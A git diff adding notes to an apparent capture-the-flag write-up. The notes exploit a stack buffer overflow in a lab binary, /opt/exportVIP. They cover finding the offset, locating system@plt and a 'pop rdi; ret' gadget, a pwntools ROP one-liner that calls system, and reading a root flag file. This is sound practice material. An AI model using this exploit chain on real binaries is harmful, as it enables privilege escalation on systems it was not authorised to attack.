@@ -303,3 +303,30 @@ georgina@SRV02-BACKUP:/dev/shm$ md5sum /opt/exportVIP
 
 ## find the vuln
 
+mass a, cyclic, rsp
+g/gx $rsp
+
+adresse de gnu
+0x4002d0
+
+
+➜  step12 git:(master) ✗ objdump -D ./exportVIP | grep system
+0000000000401060 <system@plt>:
+  40133d:	e8 1e fd ff ff       	callq  401060 <system@plt>
+
+40133d -> addr system
+
+
+ROPgadget --binary exportVIP
+0x000000000040145b : pop rdi ; ret
+
+```bash
+/opt/exportVIP < <(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)
+```
+
+## Flag
+
+```bash
+cat /root/flag-12.txt
+6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30
+```
